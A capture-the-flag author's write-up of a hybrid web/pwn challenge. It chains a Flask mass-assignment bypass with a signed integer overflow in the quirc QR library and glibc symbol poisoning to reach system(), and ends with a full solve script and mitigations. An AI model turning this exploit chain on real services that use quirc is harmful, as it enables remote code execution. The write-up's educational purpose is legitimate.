---
ctf: GPNCTF
title: Scanwich Station
authors:
    - name: vurlo
      url: /about
description: A table-side QR reader for hungry guests and suspicious menus. One special order can make the scanner serve more than dinner.
categories:
    - pwn
    - web
difficulty: Hard
ctf_year: 2026
challengefiles: scanwich-station
published: "2026-06-05"
optional:
    authored_challenge:
        event: GPNCTF 2026
        event_url: https://gpn24.ctf.kitctf.de/
        summary: Hybrid web and pwn challenge about mass assignment, QR-code decoding, signed integer overflow, and GLIBC dynamic symbol poisoning. Published for GPNCTF 2026.
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** A **Flask** web server, implementing a QR scanner, accepts PNG uploads, decodes ordinary guest tickets with a **Python** QR library, and has a faster alternative path backed by the C library [quirc](https://github.com/dlbeer/quirc) requiring some special authorization
    **- Key Discoveries:** User controlled form fields are passed into a dataclass constructor, allowing `station=kitchen`. The QR-code scanner accepts raw image dimensions where `width * height` fits neither signed 32-bit arithmetic nor several [quirc](https://github.com/dlbeer/quirc) indexing expressions
    **- Vulnerability:** A **signed integer overflow** in [quirc](https://github.com/dlbeer/quirc) lets a finder-pattern scan discover pixels at a high in-bounds offset, then re-use the same coordinates through signed arithmetic and write one byte before the **mmap**-backed image buffer
    **- Exploitation:** Corrupt **GLIBC** **mmap** chunk size metadata, free the oversized mapping, reclaim the **LIBC** prefix, then use a [House-of-Muney](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation)-style dynamic symbol poisoning chain to make lazy binding turn `puts(<payload>)` into `system(<payload>)`

# 1. Introduction<a id="introduction"></a>

**Scanwich Station** was a hybrid web and pwn challenge which I created for [GPNCTF](https://ctftime.org/event/3041) held at the [24th Gulaschprogrammiernacht](https://entropia.de/GPN24) in Karlsruhe. So if you played my challenge, I hope you had some fun digging in some random QR-code library and maybe even learned something about the incredible **GLIBC** heap. I used **codex** to assist me creating this challenge, which was very helpful as there are a lot of details you need to be aware of to successfully exploit the challenge.

The visible application is a restaurant-themed QR-code scanner. A guest uploads a menu PNG with a QR-code and the website prints the decoded QR payload.

![landing page](ctf/writeups/gpnctf/scanwich-station/01-home-page.png "landing page")

Casual users can enjoy the guest QR-code decoder path using [pyzbar](https://github.com/NaturalHistoryMuseum/pyzbar/), a Python wrapper around the [ZBar](https://github.com/mchehab/zbar) barcode library. The pwn part is hidden behind the faster kitchen scanner, which uses [quirc](https://github.com/dlbeer/quirc), but is only available for the kitchen staff.

# 2. Access To The Kitchen<a id="access to the kitchen"></a>

The first part of the challenge is about reaching the code path that starts the vulnerable [quirc](https://github.com/dlbeer/quirc) scanner. The public upload form behaves like a normal guest scanner, but the **Flask** route also forwards all submitted form fields into the decoder:

```python
@app.post("/scan")
def scan():
    try:
        filename, result = decode_upload(request.files.get("image"), request.form.to_dict())
    except Exception as exc:
        return render_error(str(exc), 400)
```

Inside the helper layer, those form values are unpacked into a dataclass constructor:

```python
@dataclass
class ScanJob:
    image: object
    station: str = "guest"

def prepare_job(upload, values):
    return ScanJob(prepare_upload(upload), **values)
```

That is a pretty basic [mass assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) vulnerability. `station` looks like internal application state, but it can be set from the multipart request body. By default the route goes to the Python decoder `guest_scan`:

```python
def decode_upload(upload, values):
    job = prepare_job(upload, values)
    if job.station == "kitchen":
        return job.image.name, kitchen_scan(job)
    return job.image.name, guest_scan(job)
```

So the bypass is just an extra field in the web request:

```text
station=kitchen
```

This turns an ordinary upload with the boring [pyzbar](https://github.com/NaturalHistoryMuseum/pyzbar/) QR-code scanner into the image being processed by the [quirc](https://github.com/dlbeer/quirc) scanner, which is initiated via Python `subprocess`:

```python
def kitchen_scan(job):
    with tempfile.TemporaryFile() as stream:
        job.image.write_to(stream, write_image)
        stream.seek(0)
        return subprocess.run(
            QRSCAN_ARGV,
            stdin=stream,
            cwd=QRSCAN_DIR,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=DECODER_TIMEOUT,
            check=False,
        )
```

The `qrscan.c` binary is heavily hardened tho:

```text
RELRO:              Partial RELRO
STACK CANARY:       Canary found
NX:                 NX enabled
PIE:                PIE enabled
RPATH:              No RPATH
RUNPATH:            No RUNPATH
Symbols:            No Symbols
FORTIFY:            Yes
Fortified:          1
Fortifiable:        4
```

The important detail is **Partial RELRO**. The final exploit does not overwrite the binary **GOT** directly, but it still relies on lazy binding of the `puts` function.

# 3. From PNG Upload To quirc Input<a id="from png upload to quirc input"></a>

The kitchen scanner does not hand the PNG file to [quirc](https://github.com/dlbeer/quirc) directly. The web layer parses uploaded PNG data with [PyPNG](https://gitlab.com/drj11/pypng/) and converts it into the tiny raw format expected by the `qrscan.c` challenge binary:

```text
uint32 width
uint32 height
width * height grayscale bytes
```

The interesting behavior is that [PyPNG](https://gitlab.com/drj11/pypng/) reads one valid PNG datastream, and the helper then keeps reading if there are bytes left:

```python
def write_image(stream, out):
    try:
        stream.seek(0)
        count = 0

        for width, height, rows in iter(lambda: read_png(stream), None):
            count += 1
            write_frame(out, width, height, rows)

        if not count:
            raise ValueError(ERROR)
    except Exception as exc:
        raise ValueError(ERROR) from exc
```

This means one uploaded file can be a concatenation of valid PNG datastreams. Each datastream becomes one native frame. The exploit uses three frames, but the uploaded artifact is still a valid PNG from the web server's point of view.

The `qrscan.c` scanner itself stays close to the [library-use example from the quirc README](https://github.com/dlbeer/quirc#library-use). It resizes the image buffer, lets the caller fill it, calls `quirc_end()`, extracts decoded QR payloads, and prints them:

```c
static int scan_frame(struct quirc *qr, uint32_t width, uint32_t height)
{
    uint8_t *image;
    size_t pixels;
    int w;
    int h;

    if (quirc_resize(qr, (int)width, (int)height) < 0)
        return -1;

    image = quirc_begin(qr, &w, &h);
    pixels = (size_t)w * h;

    if (fread(image, 1, pixels, stdin) != pixels)
        return -1;

    quirc_end(qr);

    for (int i = 0; i < quirc_count(qr); i++) {
        struct quirc_code code;
        struct quirc_data data;
        quirc_decode_error_t err;

        quirc_extract(qr, i, &code);
        err = quirc_decode(&code, &data);
        if (err == QUIRC_ERROR_DATA_ECC) {
            quirc_flip(&code);
            err = quirc_decode(&code, &data);
        }
        if (!err)
            puts((char *)data.payload);
    }

    return 0;
}
```

The dangerous input is just the image geometry and the grayscale pixels that [quirc](https://github.com/dlbeer/quirc) processes.

# 4. The quirc Integer Overflow<a id="the quirc integer overflow"></a>

The first malicious frame uses dimensions that are individually valid signed integers with `width  = 0x1000` and `height = 0x10000f`.  The exact product is a little more than 4 GB with `0x1000 * 0x10000f = 0x10000f000`, which is the reason why this challenge needed a quite fair amount of RAM during the competition. That matters because several [quirc](https://github.com/dlbeer/quirc) internals store dimensions and offsets as a signed `int`. To me, this doesn't make any sense, as sizes like the width and height of an image can't be logically negative anyways, but still thats how the authors of this library implemented it. Funny enough, in [quirc_resize](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/quirc.c#L48), the dimensions are checked for negativity and then used for allocation:

```c
int quirc_resize(struct quirc *q, int w, int h)
{
    ...
    if (w < 0 || h < 0)
        goto fail;

    image = calloc(w, h);
    ...
    q->w = w;
    q->h = h;
    free(q->image);
    q->image = image;
    ...
}
```

For the enormous exploit dimensions, **GLIBC** services the image allocation with [mmap](https://man7.org/linux/man-pages/man2/mmap.2.html) and thus allocating the image chunk off-heap. In the challenge layout this huge mapping is placed directly before **LIBC**, which later becomes useful:

![allocated chunk before libc](ctf/writeups/gpnctf/scanwich-station/02-image-before-libc.png "allocated chunk before libc")

The screenshot was taken in **GDB** at that point right after [calloc](https://linux.die.net/man/3/calloc) in [quirc_resize](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/quirc.c#L48) was called and therefore the `RAX` register contains the pointer to the allocated memory region. We can see due to allocating such a huge memory area, the chunk is not part of the **heap** anymore but instead of an **anon** region sitting right before the area where **LIBC** lives.

## 4.1. Setup Wraps The Pixel Count<a id="setup wraps the pixel count"></a>

[quirc_end](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L1104) is the core of the whole exploitation:

```c
void quirc_end(struct quirc *q)
{
    ...
	uint8_t threshold = otsu(q);
	pixels_setup(q, threshold);

	for (i = 0; i < q->h; i++)
		finder_scan(q, i);
    ...
}
```

It starts the QR identification by calling two setup routines [otsu](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L291) and [pixels_setup](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L1075) which multiply `q->w * q->h`:

```c
static uint8_t otsu(const struct quirc *q)
{
    unsigned int numPixels = q->w * q->h;
    ...
}
```

```c
static void pixels_setup(struct quirc *q, uint8_t threshold)
{
    if (QUIRC_PIXEL_ALIAS_IMAGE)
        q->pixels = (quirc_pixel_t *)q->image;

    uint8_t *source = q->image;
    quirc_pixel_t *dest = q->pixels;
    int length = q->w * q->h;

    while (length--) {
        uint8_t value = *source++;
        *dest++ = (value < threshold) ? QUIRC_PIXEL_BLACK
                                      : QUIRC_PIXEL_WHITE;
    }
}
```

We can also see that in this build, `q->pixels` aliases `q->image` with having `#define QUIRC_PIXEL_ALIAS_IMAGE 1`. That means pixel-classification writes are raw writes into the original image allocation.

At source level the multiplication is a **signed integer overflow**. In the deployed build it behaves as a two's-complement wrap. So having `width = 0x1000` and `height = 0x10000f`, this multiplication results in a product of `0x10000f000` and the low 32 bits of this product are `0x0000f000`. So setup routine only touches the low `0xf000` bytes. The high offsets of the huge image remain fully attacker-controlled. This is highly important for the next step as this allows us to place arbitrary bytes in the remaining memory which is not set up and normalized. This allows us in the next step to put specific markers inplace, processed by later functionality, which changes the calculations of [quirc](https://github.com/dlbeer/quirc).

## 4.2. Reading A High In-Bounds Marker<a id="reading a high in bounds marker"></a>

Because [pixels_setup](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L1075) only normalized the low `0xf000` bytes and `q->pixels` aliases `q->image`, these high bytes are read directly as [quirc](https://github.com/dlbeer/quirc) pixel states. The exploit therefore places `0x01` and `0x00` bytes there, corresponding to `QUIRC_PIXEL_BLACK` and `QUIRC_PIXEL_WHITE`:

```python
pattern = b"\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00"
spans.append((0xfffffff4, pattern))
```

Since each row is `0x1000` bytes wide, that linear offset is row `0xfffff`, column `0xff4`:

```text
0xfffffff4 = 0xfffff * 0x1000 + 0xff4
```

[finder_scan](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L534) is called once per row via [quirc_end](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L1104). For row `y = 0xfffff`, it computes a row pointer, scans columns from left to right, tracks the last five color run lengths in `pb`, and calls [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) when those run lengths look like a finder pattern:

```c
static void finder_scan(struct quirc *q, unsigned int y)
{
	quirc_pixel_t *row = q->pixels + y * q->w;
	unsigned int pb[5];
    ...
	for (x = 0; x < q->w; x++) {
		int color = row[x] ? 1 : 0;
        ...
		if (x && color != last_color) {
			memmove(pb, pb + 1, sizeof(pb[0]) * 4);
			pb[4] = run_length;
            ...
			if (!color && run_count >= 5) {
                ...
                if (ok)
					test_capstone(q, x, y, pb);
			}
		}

		run_length++;
		last_color = color;
	}
}
```

For our chosen row, the row pointer becomes:

```text
row = q->image + 0xfffff * 0x1000
    = q->image + 0xfffff000
```

Then the loop eventually reaches column `x = 0xff4`, where the planted marker begins:

```text
row[0xff4] = q->image + 0xfffff000 + 0xff4
           = q->image + 0xfffffff4
```

![pattern chunk before libc](ctf/writeups/gpnctf/scanwich-station/03-pattern-before-libc.png "pattern before libc")

In the image we can see the pattern `\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00` in green, close to the **LIBC** area. The bytes form the run lengths `1, 1, 3, 1, 1`: one black byte, one white byte, three black bytes, one white byte, and one black byte. [finder_scan](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L534) only checks the pattern when it sees the transition back to white after that final black run, so the call into [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) happens at `x = 0xffb` with:

```text
y  = 0xfffff
pb = { 1, 1, 3, 1, 1 }
```

## 4.3. Reusing The Coordinate With Signed Arithmetic<a id="reusing the coordinate with signed arithmetic"></a>

When the run lengths look like a finder pattern, [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) asks [region_code](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L347) about nearby regions:

```c
static void test_capstone(struct quirc *q, unsigned int x, unsigned int y,
                          unsigned int *pb)
{
    int ring_right = region_code(q, x - pb[4], y);
    int stone = region_code(q, x - pb[4] - pb[3] - pb[2], y);
    int ring_left = region_code(q, x - pb[4] - pb[3] -
                                pb[2] - pb[1] - pb[0], y);
    ...
}
```

For the malicious row, the exact [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) arguments are:

```text
q->w = 0x1000
q->h = 0x10000f

x = 0xffb
y = 0xfffff
pb = { 1, 1, 3, 1, 1 }
```

Now those coordinates reach the [region_code](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L347) function that takes signed `int` coordinates:

```c
static int region_code(struct quirc *q, int x, int y)
{
    ...
	if (x < 0 || y < 0 || x >= q->w || y >= q->h)
		return -1;

	pixel = q->pixels[y * q->w + x];

	if (pixel >= QUIRC_PIXEL_REGION)
		return pixel;

	if (pixel == QUIRC_PIXEL_WHITE)
		return -1;

	if (q->num_regions >= QUIRC_MAX_REGIONS)
		return -1;
    ...
	flood_fill_seed(q, x, y, pixel, region, area_count, box);
    ...
}
```

The bounds check validates `x` and `y` separately. However it does not validate the combined offset. The problem is the later index calculation:

```text
y * q->w = 0xfffff * 0x1000
         = 0xfffff000
         = -0x1000 as signed 32-bit
```

With the `x = 0xffb` and `pb = { 1, 1, 3, 1, 1 }` values from above, [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) probes these three positions:

```text
ring_right = region_code(q, 0xffa, 0xfffff) -> -0x1000 + 0xffa = -6
stone      = region_code(q, 0xff6, 0xfffff) -> -0x1000 + 0xff6 = -10
ring_left  = region_code(q, 0xff4, 0xfffff) -> -0x1000 + 0xff4 = -12
```

So the first [region_code](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L347) call reads `q->pixels[-6]`. That byte is actually part of the [mmap](https://man7.org/linux/man-pages/man2/mmap.2.html) chunk size field directly before `q->image`. Before the call it contains `0x01`, which is `QUIRC_PIXEL_BLACK`. Therefore `region_code()` treats it as a new black region. The later `stone` and `ring_left` probes fail and [test_capstone](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L496) eventually rejects the candidate, but that happens after the first `region_code()` call has already started flood fill from `q->pixels[-6]`.

## 4.4. Turning The Wrapped Index Into A Write<a id="turning the wrapped index into a write"></a>

If [region_code](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L347) decides the selected byte is a new black region, it calls [flood_fill_seed](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L209). The write happens in [flood_fill_line](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L132):

```c
static void flood_fill_line(struct quirc *q, int x, int y,
                            int from, int to,
                            span_func_t func, void *user_data,
                            int *leftp, int *rightp)
{
    quirc_pixel_t *row;
    ...
    row = q->pixels + y * q->w;
    ...
    left = x;
	right = x;
    ...
    for (i = left; i <= right; i++)
        row[i] = to;
}
```

So now we got a one-byte write just before the mmap-backed image allocation.

# 5. From One Byte To RCE<a id="from one byte to rce"></a>

The byte at `q->image - 6` is not random heap data as already mentioned. For a **GLIBC** mmapped allocation, the user pointer is returned after a chunk header filled with metadata like `prev_size` and `mchunk_size` which is exactly `q->image[-6]`. The exploit changes one byte of the mmapped chunk size from the original `0x100010002` value to the larger `0x100030002` value. Although this is very constrained, we can still obtain RCE and we don't even need any memory leak as the huge image mapping sits directly before **LIBC**, having a relative offset to it.

## 5.1. Frame 1 - Corrupting The mmap Chunk Size<a id="frame 1 - corrupting the mmap chunk size"></a>

The exploit uses three frames with different sizes:

```python
def frames(cmd):
    return [frame1(), (16, 16, []), frame3(cmd)]
```

Frame 1 creates the huge image allocation and plants the finder-pattern-like bytes:

```python
def frame1():
    pattern = b"\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00"
    spans = []
    for y in range(16, 16 * (SIZE_BYTE - 1), 16):
        spans += [((y - 1) * FRAME_W + 20, b"\x01" * 7),
                  (y * FRAME_W + 20, pattern)]
    spans.append((0xfffffff4, pattern))
    return FRAME_W, FRAME1_H, spans
```

The low rows shape early region ids. The high row at `0xfffffff4` is the actual integer wrap trigger. After [quirc_end](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/identify.c#L1104) processes this frame, the old image chunk header has the enlarged size byte.

## 5.2. Frame 2 - Freeing The Corrupted Mapping<a id="frame 2 - freeing the corrupted mapping"></a>

Frame 2 is intentionally very small:

```python
(16, 16, [])
```

Its purpose is to call [quirc_resize](https://github.com/dlbeer/quirc/blob/927d680904dc95fdff4cd9d022eb374b438ff8f2/lib/quirc.c#L48) again, thus allocating a new image and then freeing the old one:

```c
int quirc_resize(struct quirc *q, int w, int h)
{
    ...
	/* alloc succeeded, update `q` with the new size and buffers */
	q->w = w;
	q->h = h;
	free(q->image);
	q->image = image;
    ...
}
```

Because the old `mchunk_size` is now too large, **GLIBC**'s `free` calls [munmap](https://man7.org/linux/man-pages/man3/munmap.3p.html) with an oversized length. The unmap starts at the old image chunk and reaches into the beginning of **LIBC** and thus we can observe the memory of the first **LIBC** chunk shrinking down:

![pattern chunk before libc](ctf/writeups/gpnctf/scanwich-station/04-oversized-munmap.png "pattern before libc")

One neat detail: the exploit is not writing through a `r--p` **LIBC** mapping. Page permissions like `r--p` only apply while that virtual memory area exists. `munmap()` removes mappings from the process address space. So when the corrupted free reaches into the first read-only **LIBC** mapping, the kernel simply splits/removes that VMA. The process no longer has a `r--p` **LIBC** mapping for that prefix at all. It has a free virtual address hole which a later [mmap](https://man7.org/linux/man-pages/man2/mmap.2.html) can reuse with different permissions.

## 5.3. Frame 3 - Reclaiming libc's Prefix<a id="frame 3 - reclaiming libcs prefix"></a>

Frame 3 is another large image. Its size is chosen so [calloc](https://linux.die.net/man/3/calloc) reuses the address range that was just unmapped. Since the new image overlaps addresses that previously belonged to the beginning of **LIBC**, selected image bytes become writes into the dynamic-linking metadata at those virtual addresses. At this point those bytes live in the new writable anonymous image mapping:

```python
def frame3(cmd):
    return FRAME_W, FRAME3_H, qr_spans(cmd) + [
        (RECLAIM_DELTA + PUTS_BLOOM_OFF, struct.pack("<Q", PUTS_BLOOM)),
        (RECLAIM_DELTA + PUTS_BUCKET_OFF, struct.pack("<I", PUTS_IDX)),
        (RECLAIM_DELTA + PUTS_CHAIN_OFF, struct.pack("<I", PUTS_GNU_HASH)),
        (RECLAIM_DELTA + PUTS_SYM_OFF, PUTS_SYM),
    ]
```

Only a few bytes need to be repaired or changed:

```python
RECLAIM_DELTA = 0x10000fff0
PUTS_IDX = 235
PUTS_GNU_HASH = 0x7c9c7b11
PUTS_BLOOM_OFF = 0x5478
PUTS_BLOOM = 0x100000000020000
PUTS_BUCKET_OFF = 0x5624
PUTS_CHAIN_OFF = 0x6838
PUTS_SYM_OFF = 0xabe8
PUTS_SYM = bytes.fromhex("b56c00002200110050870500000000002602000000000000")
```

This is a [House of Muney](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation)-style step. Rather than overwriting a **GOT** entry directly, the exploit corrupts the dynamic symbol metadata consumed by the lazy resolver. In other words, it does not manually write a `puts -> system` function pointer. Instead, it modifies the `Elf64_Sym` entry for `puts`, changing its `st_value` to the libc-relative offset of `system`. When the program later resolves `puts`, the dynamic linker performs the normal lookup process but computes the resolved address as `libc_base + system_offset`, effectively binding `puts@plt` to `system`.

Frame 3 also contains a real QR code whose decoded payload is `/read_flag`. After the frame is processed, the `qrscan.c` binary reaches its normal output path:

```c
if (!err)
    puts((char *)data.payload);
```

Under Partial RELRO, this first `puts` call is lazily resolved. The dynamic linker uses the metadata that frame 3 reclaimed and patched at **LIBC**'s original prefix addresses, resolves `puts` to `system`, and the call becomes effectively:

```c
system("/read_flag");
```

# 6. Mitigation<a id="mitigation"></a>

There are two independent fixes. For the web layer, never unpack arbitrary request fields into internal state or explicitly allowlist fields that are meant to be public. A field like `station` should not be controlled by the upload request.

For [quirc](https://github.com/dlbeer/quirc), the dimension arithmetic needs to use a type that can represent the product, and bounds checks need to validate the combined product and offset, not only the individual coordinates.

# 7. Solve Script<a id="solve script"></a>

```python
#!/usr/bin/env python3

import struct
import subprocess
import sys
from pathlib import Path
from tempfile import TemporaryFile

import png
import requests
import segno


FLAG_CMD = "/read_flag"

FRAME_W = 0x1000
FRAME1_H = 0x10000f
FRAME3_H = 0x10002f
SIZE_BYTE = 3
RECLAIM_DELTA = 0x10000fff0
PUTS_IDX = 235
PUTS_GNU_HASH = 0x7c9c7b11
PUTS_BLOOM_OFF = 0x5478
PUTS_BLOOM = 0x100000000020000
PUTS_BUCKET_OFF = 0x5624
PUTS_CHAIN_OFF = 0x6838
PUTS_SYM_OFF = 0xabe8
PUTS_SYM = bytes.fromhex("b56c00002200110050870500000000002602000000000000")


def main():
    mode = sys.argv[1].upper() if len(sys.argv) > 1 else "REMOTE"

    if mode == "LOCAL":
        run_local(sys.argv[2:])
    else:
        run_remote(sys.argv[2:] if mode == "REMOTE" else sys.argv[1:])


def run_remote(args):
    url = target_url(args)
    payload = png_payload(frames(FLAG_CMD))
    response = requests.post(
        url.rstrip("/") + "/scan?raw=1",
        data={"station": "kitchen"},
        files={"image": ("ticket.png", payload, "image/png")},
        timeout=180,
    )
    response.raise_for_status()
    sys.stdout.buffer.write(response.content)


def run_local(args):
    with raw_payload(frames(FLAG_CMD)) as payload:
        result = subprocess.run(
            local_argv(args),
            stdin=payload,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=180,
            check=False,
        )
    sys.stdout.buffer.write(result.stdout)
    sys.stderr.buffer.write(result.stderr)
    raise SystemExit(result.returncode)


def target_url(args):
    host = args[0] if args else "127.0.0.1"
    port = args[1] if len(args) > 1 else "5000"
    scheme = "https" if host not in ("127.0.0.1", "localhost") else "http"
    return f"{scheme}://{host}:{port}"


def local_argv(args):
    if not args:
        args = ["./qrscan"]
    if len(args) == 1:
        exe = Path(args[0])
        loader = exe.with_name("ld-linux-x86-64.so.2")
        if loader.exists():
            return [str(loader), "--library-path", str(exe.parent), str(exe)]
    return args


def frames(cmd):
    return [frame1(), (16, 16, []), frame3(cmd)]


def frame1():
    pattern = b"\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00"
    spans = []
    for y in range(16, 16 * (SIZE_BYTE - 1), 16):
        spans += [((y - 1) * FRAME_W + 20, b"\x01" * 7),
                  (y * FRAME_W + 20, pattern)]
    spans.append((0xfffffff4, pattern))
    return FRAME_W, FRAME1_H, spans


def frame3(cmd):
    return FRAME_W, FRAME3_H, qr_spans(cmd) + [
        (RECLAIM_DELTA + PUTS_BLOOM_OFF, struct.pack("<Q", PUTS_BLOOM)),
        (RECLAIM_DELTA + PUTS_BUCKET_OFF, struct.pack("<I", PUTS_IDX)),
        (RECLAIM_DELTA + PUTS_CHAIN_OFF, struct.pack("<I", PUTS_GNU_HASH)),
        (RECLAIM_DELTA + PUTS_SYM_OFF, PUTS_SYM),
    ]


def qr_spans(text):
    qr = segno.make(text, error="l", version=2, micro=False, boost_error=False)
    return [((64 + y) * FRAME_W + 32, bytes(row))
            for y, row in enumerate(qr.matrix_iter(scale=8, border=4))]


def raw_payload(frames):
    out = TemporaryFile()
    for width, height, spans in frames:
        base = out.tell()
        out.write(struct.pack("<II", width, height))
        out.truncate(base + 8 + width * height)
        for offset, data in spans:
            out.seek(base + 8 + offset)
            out.write(data)
        out.seek(base + 8 + width * height)
    out.seek(0)
    return out


def png_payload(frames):
    out = TemporaryFile()
    for width, height, spans in frames:
        png.Writer(width, height, greyscale=True, bitdepth=8).write(
            out, sparse_rows(width, height, spans))
    out.seek(0)
    return out.read()


def sparse_rows(width, height, spans):
    rows = {}
    for offset, data in spans:
        while data:
            y, x = divmod(offset, width)
            n = min(width - x, len(data))
            rows.setdefault(y, bytearray(width))[x:x + n] = data[:n]
            offset += n
            data = data[n:]
    zero = b"\0" * width
    for y in range(height):
        yield bytes(rows[y]) if y in rows else zero


if __name__ == "__main__":
    main()
```

# 8. Flag<a id="flag"></a>

GPNCTF{scANwiCh_5TATioN_SP3cI4L_oRdER_3x7R4_sH31l5}
